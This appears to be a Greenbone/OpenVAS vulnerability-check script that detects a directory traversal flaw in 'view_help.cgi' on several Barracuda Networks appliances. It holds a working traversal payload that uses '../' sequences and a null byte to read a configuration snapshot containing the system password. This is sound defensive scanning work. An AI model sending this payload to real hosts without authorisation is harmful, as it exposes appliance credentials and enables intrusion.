if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100847" );
	script_version( "2021-07-28T08:40:06+0000" );
	script_tag( name: "last_modification", value: "2021-07-28 08:40:06 +0000 (Wed, 28 Jul 2021)" );
	script_tag( name: "creation_date", value: "2010-10-06 12:55:58 +0200 (Wed, 06 Oct 2010)" );
	script_bugtraq_id( 43520 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "Barracuda Networks Multiple Products 'view_help.cgi' Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/43520" );
	script_xref( name: "URL", value: "http://www.barracudanetworks.com/ns/support/tech_alert.php" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "find_service.sc", "httpver.sc", "gb_get_http_banner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "BarracudaHTTP/banner" );
	script_tag( name: "summary", value: "Multiple Barracuda Networks products are prone to a directory-
  traversal vulnerability because it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "A remote attacker can exploit this vulnerability using directory-
  traversal characters ('../') to access files that contain sensitive information that can aid in
  further attacks." );
	script_tag( name: "affected", value: "Barracuda IM Firewall 3.4.01.004 and earlier

  Barracuda Link Balancer 2.1.1.010 and earlier

  Barracuda Load Balancer 3.3.1.005 and earlier

  Barracuda Message Archiver 2.2.1.005 and earlier

  Barracuda Spam & Virus Firewall 4.1.2.006 and earlier

  Barracuda SSL VPN 1.7.2.004 and earlier

  Barracuda Web Application Firewall 7.4.0.022 and earlier

  Barracuda Web Filter 4.3.0.013 and earlier" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General solution
  options are to upgrade to a newer release, disable respective features, remove the product or
  replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
for dir in make_list( "/cgi-mod",
	 "/cgi-bin" ) {
	url = dir + "/view_help.cgi?locale=/../../../../../../../mail/snapshot/config.snapshot%00";
	if(http_vuln_check( port: port, url: url, pattern: "system_password", extra_check: make_list( "system_netmask",
		 "system_default_domain" ) )){
		report = http_report_vuln_url( port: port, url: url );
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 0 );

